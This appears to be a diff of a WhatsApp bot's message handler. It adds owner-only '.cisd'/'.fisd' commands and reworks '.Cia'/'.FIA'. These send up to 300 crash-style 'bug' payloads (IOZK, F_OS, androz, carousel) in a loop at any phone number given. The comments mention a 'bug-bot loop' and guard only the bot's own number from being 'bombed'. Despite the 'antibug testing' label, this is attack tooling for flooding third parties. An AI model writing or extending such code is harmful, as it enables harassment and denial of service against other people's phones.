@@ -4767,7 +4767,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         if (cisWords.length > 2) {
-            await safeWaReply(sock, remoteJid, '⚠️ .cis is a one-shot — no amount needed. Usage: .cis <number>', msg);
+            await safeWaReply(sock, remoteJid, '⚠️ .cis is a one-shot — no amount needed. For floods use .cisd <number> <amount>.', msg);
             return;
         }
 
@@ -4827,7 +4827,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         if (cisWords.length > 2) {
-            await safeWaReply(sock, remoteJid, '⚠️ .fis is a one-shot — no amount needed. Usage: .fis <number>', msg);
+            await safeWaReply(sock, remoteJid, '⚠️ .fis is a one-shot — no amount needed. For floods use .fisd <number> <amount>.', msg);
             return;
         }
 
@@ -4868,6 +4868,76 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         } catch (err) {
             logError('FIS', `${phoneNumber}: F_OS probe failed`, err);
             await safeWaReply(sock, remoteJid, `❌ .fis send failed: ${err?.message || err}`, msg);
+        }
+        return;
+    }
+
+    // 🧪 TEMPORARY `.cisd <number> <amount>` / `.fisd <number> <amount>` —
+    // flood versions of the .cis/.fis one-shot probes (IOZK / F_OS payloads).
+    // Owner/dev only; amount required (1-300). Pacing is the payload funcs'
+    // own ~1s pause per send — identical to the original bug-bot loop.
+    const isCisdCommand = cisFirstWord === '.cisd' || cisFirstWord === `${cisPrefix}cisd`;
+    const isFisdCommand = cisFirstWord === '.fisd' || cisFirstWord === `${cisPrefix}fisd`;
+    if (isCisdCommand || isFisdCommand) {
+        const dSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
+        const dIsOwner = fromMe || (
+            !!sock.user?.id &&
+            jidNormalizedUser(dSenderJid) === jidNormalizedUser(sock.user.id)
+        );
+        if (!dIsOwner && !isDevNumber(dSenderJid)) {
+            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
+            return;
+        }
+
+        const dKind = isCisdCommand ? 'cisd' : 'fisd';
+        const dParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
+        if (dParts.length < 2 || !/^\d{1,3}$/.test(dParts[dParts.length - 1])) {
+            await safeWaReply(sock, remoteJid,
+                `❌ *USAGE*\n\n.${dKind} <number> <amount 1-300>\n\nExample: .${dKind} 2347050253122 200`, msg);
+            return;
+        }
+        const dCount = Math.min(300, Number(dParts[dParts.length - 1]));
+        const dTargetInput = dParts.slice(0, -1).join(' ').trim();
+        const dTargetNumber = dTargetInput.replace(/\D/g, '');
+        if (!/^\+?[\d\s-]+$/.test(dTargetInput) || dTargetNumber.length < 8 || dTargetNumber.length > 15) {
+            await safeWaReply(sock, remoteJid, `Usage: .${dKind} <number> <amount>`, msg);
+            return;
+        }
+
+        // Safety: the bot's OWN number can never be a target.
+        const botNum = String(phoneNumber || '').replace(/\D/g, '')
+            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
+        if (dTargetNumber === botNum) {
+            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
+            return;
+        }
+
+        const dTargetJid = `${dTargetNumber}@s.whatsapp.net`;
+        try {
+            const [waCheck] = await sock.onWhatsApp(dTargetJid);
+            if (!waCheck?.exists) {
+                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${dTargetNumber}`, msg);
+                return;
+            }
+        } catch (_) { /* lookup failed — try the send anyway */ }
+
+        // Pause Supabase session sync for the burst (same as .Cia/.FIA).
+        const dSyncPause = isSupabaseEnabled();
+        if (dSyncPause) setSyncPaused(true);
+        let dSent = 0;
+        try {
+            for (let n = 0; n < dCount; n++) {
+                if (isCisdCommand) await sendIozkProbe(sock, dTargetJid);
+                else await sendFiosProbe(sock, dTargetJid);
+                dSent++;
+                log('TEST', `${phoneNumber}: .${dKind} send ${dSent}/${dCount} → ${dTargetJid}`);
+            }
+            await safeWaReply(sock, remoteJid, `🧪 .${dKind} payload sent ×${dSent} → ${dTargetNumber}`, msg);
+        } catch (err) {
+            logError('TEST', `${phoneNumber}: .${dKind} failed after ${dSent} send(s)`, err);
+            await safeWaReply(sock, remoteJid, `❌ .${dKind} sent ×${dSent} then failed: ${err?.message || err}`, msg);
+        } finally {
+            if (dSyncPause) setSyncPaused(false);
         }
         return;
     }
@@ -6813,26 +6883,20 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     
 
 
-    // 🧪 TEMPORARY .Cia/.Ciad/.FIA/.FIAd — sandbox payloads (owner/dev only;
-    // delete with the other test commands when antibug testing ends).
-    //   ".Cia"               → usage help only (never fires bare)
-    //   ".Cia <number>"      → ONE androz payload at that number
-    //   ".Ciad <number> <N>" → androz FLOOD (N required, 1-300)
-    //   ".FIA"               → usage help only (never fires bare)
-    //   ".FIA <number>"      → ONE carousel payload
-    //   ".FIAd <number> <N>"         → carousel FLOOD (N required, 1-300)
-    //   Passing an amount to .Cia/.FIA replies "amount not needed" — floods
-    //   live on the d-commands. Case-insensitive. The bot's OWN number is
+    // 🧪 TEMPORARY .Cia / .FIA — sandbox payloads (owner/dev only; delete with
+    // the other test commands when antibug testing ends).
+    //   ".Cia"                  → usage help only (never fires bare)
+    //   ".Cia <number>"         → ONE androz payload at that number
+    //   ".Cia <number> <N>"     → androz burst/flood (N optional, 1-300)
+    //   ".FIA" / ".FIA <number>" / ".FIA <number> <N>" → same for carousel
+    //   Flood versions of the one-shot .cis/.fis probes live on .cisd/.fisd
+    //   (see their own block). Case-insensitive. The bot's OWN number is
     //   rejected as a target — firing at it would bomb the bot's own phone.
     const isCiaCommand = token === '.cia';
     const isFiaCommand = token === '.fia';
-    const isCiadCommand = token === '.ciad';
-    const isFiadCommand = token === '.fiad';
-    if (isCiaCommand || isFiaCommand || isCiadCommand || isFiadCommand) {
-        const payloadKind = (isFiaCommand || isFiadCommand) ? 'testfff' : 'androz';
-        const isFloodCommand = isCiadCommand || isFiadCommand;
-        const displayKind = isCiadCommand ? 'Ciad' : isFiadCommand ? 'FIAd'
-            : (isFiaCommand ? 'FIA' : 'Cia');
+    if (isCiaCommand || isFiaCommand) {
+        const payloadKind = isFiaCommand ? 'testfff' : 'androz';
+        const displayKind = isFiaCommand ? 'FIA' : 'Cia';
         // Owner / dev only.
         if (!isSenderOwner && !isDevNumber(senderJid)) {
             await safeWaReply(sock, remoteJid, '❌ Owner only.', msg);
@@ -6840,29 +6904,20 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         const input = args.join(' ').trim();
-        const parts = input.split(/\s+/).filter(Boolean);
 
-        // .Ciad/.FIad take <number> <amount>; .Cia/.FIA are one-shots and
-        // refuse an amount argument with a pointer to the d-command.
-        let targetInput = '';
+        // Optional trailing count, e.g. ".cia 234xxx 200". Only a trailing
+        // 1–3 digit token counts (real numbers are longer). Default = 1 shot.
+        let targetInput = input;
         let count = 1;
         let flood = false;
-        if (isFloodCommand) {
-            if (parts.length < 2 || !/^\d{1,3}$/.test(parts[parts.length - 1])) {
-                await safeWaReply(sock, remoteJid,
-                    `❌ *USAGE*\n\n.${displayKind} <number> <amount 1-300>\n\nExample: .${displayKind} 2347050253122 200`, msg);
-                return;
+        {
+            const cw = targetInput.split(/\s+/).filter(Boolean);
+            if (cw.length >= 2 && /^\d{1,3}$/.test(cw[cw.length - 1])) {
+                count = Math.min(300, Number(cw[cw.length - 1]));
+                flood = count > 10; // bug-bot pacing only for real floods
+                cw.pop();
+                targetInput = cw.join(' ').trim();
             }
-            count = Math.min(300, Number(parts[parts.length - 1]));
-            flood = count > 10; // bug-bot pacing only for real floods
-            targetInput = parts.slice(0, -1).join(' ').trim();
-        } else {
-            if (parts.length >= 2 && /^\d{1,3}$/.test(parts[parts.length - 1])) {
-                await safeWaReply(sock, remoteJid,
-                    `⚠️ Amount not needed — .${displayKind} is a one-shot.\n\nFor floods use .${displayKind}d <number> <amount>.`, msg);
-                return;
-            }
-            targetInput = parts.join(' ').trim();
         }
 
         // Bare .Cia/.FIA (no target) → usage help only. These commands never
@@ -6871,7 +6926,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             await safeWaReply(sock, remoteJid,
                 `🧪 *${displayKind} USAGE*\n\n` +
                 `• .${displayKind} <number> — one shot at that number\n` +
-                `• .${displayKind}d <number> <amount> — flood (1-300)`, msg);
+                `• .${displayKind} <number> <amount> — flood (1-300)`, msg);
             return;
         }
 
@@ -6883,7 +6938,8 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 await safeWaReply(sock, remoteJid,
                     `❌ *USAGE*\n\n` +
                     `• .${displayKind} — fires here (current chat)\n` +
-                    `• .${displayKind} <number> — target number` + (isFloodCommand ? `\n• amount (1-300) is required` : ''),
+                    `• .${displayKind} <number> — one shot\n` +
+                    `• .${displayKind} <number> <1-300> — burst/flood count`,
                     msg);
                 return;
             }
